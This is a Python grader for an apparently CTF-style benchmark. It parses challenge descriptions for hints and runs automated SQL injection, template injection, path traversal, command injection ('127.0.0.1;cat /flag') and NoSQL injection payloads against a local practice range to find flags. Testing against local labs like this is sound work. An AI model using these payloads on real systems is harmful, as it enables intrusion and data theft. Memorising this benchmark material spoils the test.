#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
真题形态靶场判定器（Python 侧，与 Go web_hints.go 互为镜像）

与 judge_web.py 的区别：本判定器复刻的是「读题取线索 → 定向打」这条新链路，
靶场端点（/cmd.php、/index.php、/profile、/fetch.php、/login.php、/api/auth）
刻意不在硬编码探测列表里。

A/B 对照（与 Go TestHintDrivenWebExploit 同口径）：
  A 组：只给 URL，不给题目描述（只能靠首页链接抓取）
  B 组：给题目描述，解析端点/参数/载荷/漏洞类型后定向打
两组各自独立实现，与 Go 侧结果互证。

跨语言 parity 口径（2026-10-16 接线，见 parity_registry.json【5】）：
  跨语言互证的对象是 **B 组逐题命中集**：本脚本对每题 B 组命中时打印 `✅ HIT <pid>`，
  与 Go 侧同构，由 scripts/check_suite_parity.py 逐题比对（实测两侧均 6/6 一致）。
  **A 组（无线索基线）两侧实现口径不同**（本侧 = 首页爬链 + 全类型回退，实测 3/6；
  Go 侧 = ExploitWebTarget 硬编码端点猜测，实测 4/6），故「增量」数字**不跨语言互证**，
  只在各侧内部作对照。本脚本对 A 组只要求「增量严格为正」（fail-closed）。

用法： python judge_web_hints.py
"""
import hashlib
import json
import os
import re
import socket
import subprocess
import sys
import time
import urllib.parse
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
RANGE_PY = os.path.join(HERE, "live_target", "web_range_hints.py")
BENCH = os.path.join(HERE, "web_hint_benchmark.json")
PORT = int(os.environ.get("HINT_PORT", "18098"))

FLAG_RE = re.compile(r"(?:flag|FLAG|picoCTF|ctf)\{[^}]{3,80}\}")
LINK_RE = re.compile(r"""(?:href|src|action)\s*=\s*["'](/[^"'#>]{1,120})""", re.I)
STATIC_EXT = (".css", ".js", ".png", ".jpg", ".jpeg", ".gif", ".svg", ".ico", ".woff", ".woff2")


def sh(s: str) -> str:
    return hashlib.sha256(s.encode()).hexdigest()


# 🔴 显式禁用代理：本脚本只跟 127.0.0.1 的靶场通信，但环境里若设了
# HTTP_PROXY/HTTPS_PROXY（本机实测有 http://127.0.0.1:8772 这类本地代理），
# urllib 会把发往 127.0.0.1 的请求也送进代理 → 超时 → fetch 恒返回 0
# → wait_ready 永远不就绪 → 整个 judge 退出码 1（实测报「靶场未就绪」，
# 而同一时刻 curl 直连靶场是通的，极易误判成靶场坏了）。
# ProxyHandler({}) 让本脚本的请求完全绕开代理；CI 无代理时行为不变。
_LOCAL_OPENER = urllib.request.build_opener(urllib.request.ProxyHandler({}))


def fetch(url, data=None, ctype=None, timeout=5.0):
    try:
        req = urllib.request.Request(url, data=data)
        if ctype:
            req.add_header("Content-Type", ctype)
        with _LOCAL_OPENER.open(req, timeout=timeout) as r:
            return r.status, r.read(), dict(r.headers)
    except Exception:
        return 0, b"", {}


# ───────────────────────── 线索解析（镜像 Go ParseWebHints） ─────────────────────────

METHOD_PATH = re.compile(r"(?i)\b(?:GET|POST|PUT|DELETE)\s+(/[A-Za-z0-9_\-./%{}]*)")
FILE_PATH = re.compile(r"/[A-Za-z0-9_\-./]*\.(?:php|asp|aspx|jsp|jspx|py|html?|json|txt|action|do|cgi)\b")
BARE_PATH = re.compile(r"/(?:[A-Za-z0-9_\-]+/)+[A-Za-z0-9_\-]+"
                       r"|/(?:login|admin|index|cmd|fetch|page|search|profile|upload|api|xml|source|robots\.txt|internal)\b[A-Za-z0-9_\-./]*")
QUERY_PARAM = re.compile(r"[?&]([A-Za-z_][A-Za-z0-9_]{0,20})=")
JSON_KEY = re.compile(r'"([A-Za-z_][A-Za-z0-9_]{0,20})"\s*:')
FORM_PAIR = re.compile(r"\b([A-Za-z_][A-Za-z0-9_]{0,20})=([^\s&\"'<>]{1,40})")
PARAM_WORD = re.compile(r"(?i)(?:参数名|参数|字段|param(?:eter)?|var|变量)\s*[:：为]?\s*[\"']?([A-Za-z_][A-Za-z0-9_]{0,20})")

TYPES = [
    ("sqli", re.compile(r"(?i)or\s+1=1|'\s*or\s*'|or\s+'1'='1|union\s+select|sql\s*注入|sqli")),
    ("ssti", re.compile(r"\{\{|\}\}|ssti|模板注入|jinja|twig")),
    ("lfi", re.compile(r"\.\./|etc/passwd|flag\.txt|文件包含|路径遍历|lfi|rfi")),
    ("cmdi", re.compile(r"[;&|]\s*(?:cat|ls|id|whoami|curl|wget)|命令注入|rce|cmdi|exec")),
    ("ssrf", re.compile(r"(?i)ssrf|127\.0\.0\.1|localhost|file://|内网|internal")),
    ("nosql", re.compile(r"\$ne|\$gt|\$regex|\$where|nosql|mongodb|mongo")),
]
BLACK = {"http", "https", "utf", "charset", "xmlns", "content", "type", "xml"}


def parse_hints(text):
    eps, params, payloads, types = [], [], [], []
    seen = set()

    def add(dst, v):
        v = (v or "").strip()
        if not v or v in seen or len(dst) >= 12:
            return
        seen.add(v)
        dst.append(v)

    for rx in (METHOD_PATH, FILE_PATH, BARE_PATH):
        for m in rx.findall(text or "")[:12]:
            p = m if isinstance(m, str) else m[-1]
            p = p.split("?")[0]
            if p and p != "/" and "//" not in p:
                add(eps, p)
    for rx in (QUERY_PARAM, JSON_KEY, FORM_PAIR, PARAM_WORD):
        for m in rx.findall(text or "")[:24]:
            k = m[0] if isinstance(m, tuple) else m
            if k and k.lower() not in BLACK:
                add(params, k)
    for tok in re.split(r"[\n\r\"']", text or ""):
        t = tok.strip()
        if 6 <= len(t) <= 120 and any(s in t for s in
                                      ("{{", "../", "OR 1=1", "$ne", ";cat ", "|cat ", "127.0.0.1", "etc/passwd")):
            add(payloads, t)
    for name, rx in TYPES:
        if rx.search(text or ""):
            types.append(name)
    return {"endpoints": eps, "params": params, "payloads": payloads, "types": types}


# ───────────────────────── 渗透（镜像 Go exploitHintStages） ─────────────────────────

def params_for(hints, kind, fallback):
    out, seen = [], set()
    for p in list(hints["params"]) + list(fallback):
        if p and p not in seen:
            seen.add(p)
            out.append(p)
    return out[:8]


def scan(body):
    return [f for f in FLAG_RE.findall(body.decode("utf-8", "replace"))]


def exploit(base, hints, budget=260):
    found = []
    reqs = [0]

    def get(u):
        if reqs[0] >= budget:
            return 0, b""
        reqs[0] += 1
        code, body, _ = fetch(u)
        if body:
            found.extend(scan(body))
        return code, body

    def post(u, data, ctype="application/x-www-form-urlencoded"):
        if reqs[0] >= budget:
            return
        reqs[0] += 1
        _, body, _ = fetch(u, data=data.encode(), ctype=ctype)
        if body:
            found.extend(scan(body))

    # 首页 + 链接抓取
    _, home = get(base + "/")
    links = []
    for m in LINK_RE.findall(home.decode("utf-8", "replace")):
        p = m.split("?")[0]
        if not p.lower().endswith(STATIC_EXT):
            links.append(p)

    eps, seen = [], set()
    for p in list(hints["endpoints"]) + sorted(set(links)):
        if p and p != "/" and p not in seen:
            seen.add(p)
            eps.append(p)
    eps = eps[:8]

    types = hints["types"] or ["sqli", "ssti", "lfi", "cmdi", "ssrf", "nosql"]

    for ep in eps:
        get(base + ep)
        if "sqli" in types:
            pls = [p for p in hints["payloads"] if "OR" in p.upper() or "--" in p]
            pls += ["admin' OR 1=1--", "admin' OR '1'='1", "' OR 1=1#", "admin'--"]
            for pl in pls:
                for prm in params_for(hints, "sqli", ["user", "username", "pass", "password"]):
                    get(base + ep + "?" + prm + "=" + urllib.parse.quote(pl))
                    data = "&".join(
                        f"{o}={urllib.parse.quote(pl) if o == prm else 'x'}"
                        for o in params_for(hints, "sqli", ["user", "username", "pass", "password"]))
                    post(base + ep, data)
        if "ssti" in types:
            for prm in params_for(hints, "ssti", ["name", "q", "input", "text", "msg"]):
                _, b = get(base + ep + "?" + prm + "=" + urllib.parse.quote("{{7*7}}"))
                if b"49" in b:
                    for pl in ("{{flag()}}", "{{config.FLAG}}", "{{config['FLAG']}}"):
                        get(base + ep + "?" + prm + "=" + urllib.parse.quote(pl))
        if "lfi" in types:
            pls = [p for p in hints["payloads"] if "../" in p or "flag.txt" in p]
            pls += ["../../../../etc/passwd", "flag.txt", "../flag.txt", "/flag.txt"]
            for prm in params_for(hints, "lfi", ["page", "file", "path", "template", "doc"]):
                for pl in pls:
                    get(base + ep + "?" + prm + "=" + urllib.parse.quote(pl))
        if "cmdi" in types:
            pls = [p for p in hints["payloads"] if any(c in p for c in ";&|")]
            pls += ["127.0.0.1;cat /flag", "127.0.0.1;cat /flag.txt", "127.0.0.1|cat /flag"]
            for prm in params_for(hints, "cmdi", ["ip", "cmd", "host", "ping"]):
                for pl in pls:
                    get(base + ep + "?" + prm + "=" + urllib.parse.quote(pl))
        if "ssrf" in types:
            inners = [p for p in hints["payloads"] if p.startswith("http") or "127.0.0.1" in p]
            inners += [base + "/internal/admin", base + "/admin"]
            for prm in params_for(hints, "ssrf", ["url", "uri", "target", "fetch", "link"]):
                for inner in inners:
                    get(base + ep + "?" + prm + "=" + urllib.parse.quote(inner))
        if "nosql" in types:
            keys = params_for(hints, "nosql", ["user", "pass", "username", "password"])
            k1 = keys[0]
            k2 = keys[1] if len(keys) > 1 else keys[0]
            pls = [p for p in hints["payloads"] if "$ne" in p or "$gt" in p]
            pls += [f'{{"{k1}":{{"$ne":""}},"{k2}":{{"$ne":""}}}}',
                    f'{{"{k1}":{{"$gt":""}},"{k2}":{{"$gt":""}}}}']
            for pl in pls:
                post(base + ep, pl, "application/json")
    return found


def port_busy(port, timeout=0.5):
    """端口是否已被占用（TCP 层判定）。

    ⚠️ 刻意**不用 HTTP 探测**：端口在监听但进程卡住/未响应时，HTTP 请求会超时，
    会被误判成"端口空闲"，于是新靶场起不来、wait_ready 也连不上，最终报
    「靶场未就绪」——把"端口被占"伪装成"靶场坏了"（2026-10-24 实测踩到）。
    TCP connect 成功 = 确实有监听者，这才是"被占用"的正确定义。
    """
    try:
        with socket.create_connection(("127.0.0.1", port), timeout=timeout):
            return True
    except OSError:
        return False


def wait_port_free(port, timeout=8.0):
    """等端口彻底空闲。返回 False 表示超时仍被占用。"""
    end = time.time() + timeout
    while time.time() < end:
        if not port_busy(port):
            return True
        time.sleep(0.1)
    return False


def wait_ready(port, timeout=12.0):
    end = time.time() + timeout
    while time.time() < end:
        code, _, _ = fetch(f"http://127.0.0.1:{port}/", timeout=1.0)
        if code:
            return True
        time.sleep(0.1)
    return False


def main():
    doc = json.load(open(BENCH, encoding="utf-8"))
    probs = doc["problems"]
    # 🔴 起靶场前先确认端口干净（2026-10-24 实锤：quant 的 run_all_benchmarks 刚跑过本脚本，
    # 上一轮靶场可能还占着 PORT；此时 wait_ready 会**连上陈旧实例**并在它上面判分——
    # 结果错误但看起来"跑完了"，比直接失败更危险。宁可 fail-closed 也不在陈旧实例上判分。）
    if not wait_port_free(PORT):
        print(f"[fail-closed] 端口 {PORT} 仍被占用（疑似上一轮残留靶场），拒绝在陈旧实例上判分")
        return 1
    proc = subprocess.Popen([sys.executable, RANGE_PY, str(PORT)],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        if not wait_ready(PORT):
            print("靶场未就绪")
            return 1
        base = f"http://127.0.0.1:{PORT}"
        a_hit = b_hit = 0
        for pid in sorted(probs):
            p = probs[pid]
            want = p["flag_sha256"]
            a = any(sh(f) == want for f in exploit(base, parse_hints("")))
            b = any(sh(f) == want for f in exploit(base, parse_hints(p["description"])))
            a_hit += 1 if a else 0
            b_hit += 1 if b else 0
            print(f"  {pid:<12} A组(无线索)={'HIT' if a else 'MISS'}  B组(有线索)={'HIT' if b else 'MISS'}")
            if b:
                print(f"✅ HIT  {pid}")  # 逐题机验口径，供 check_suite_parity.py 抽取
        n = len(probs)
        print(f"=== Python 侧线索定向渗透: A组 {a_hit}/{n} | B组 {b_hit}/{n} "
              f"| 增量 +{b_hit - a_hit} ===")
        if b_hit != n:
            return 1
        if a_hit >= b_hit:
            print(f"[fail-closed] 对照基线失效：无线索 {a_hit} >= 有线索 {b_hit}，线索增量非正")
            return 1
        return 0
    finally:
        # kill 之后必须 wait() 回收：否则进程变僵尸、端口不会立即释放，
        # 紧接着的下一次运行（quant → parity 连续跑）就会撞上"端口被占用"。
        proc.kill()
        try:
            proc.wait(timeout=5)
        except Exception:  # noqa: BLE001
            pass
        wait_port_free(PORT, timeout=5)


if __name__ == "__main__":
    sys.exit(main())
